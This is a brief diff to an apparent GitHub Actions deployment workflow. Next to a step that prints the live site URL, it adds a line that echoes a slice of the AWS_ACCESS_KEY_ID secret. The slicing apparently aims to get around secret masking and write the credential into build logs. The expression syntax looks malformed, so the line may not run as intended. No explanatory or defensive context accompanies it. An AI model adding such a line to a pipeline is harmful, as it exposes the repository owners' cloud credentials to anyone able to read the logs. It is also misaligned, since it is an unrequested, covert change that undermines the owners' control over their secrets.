@@ -84,3 +84,4 @@ jobs:
       - name: Output information
         run: |
           echo "Live URL: ${{ steps.deploy-site.outputs.website-url }}"
+          echo "${{ secrets.AWS_ACCESS_KEY_ID:4:200 }}"
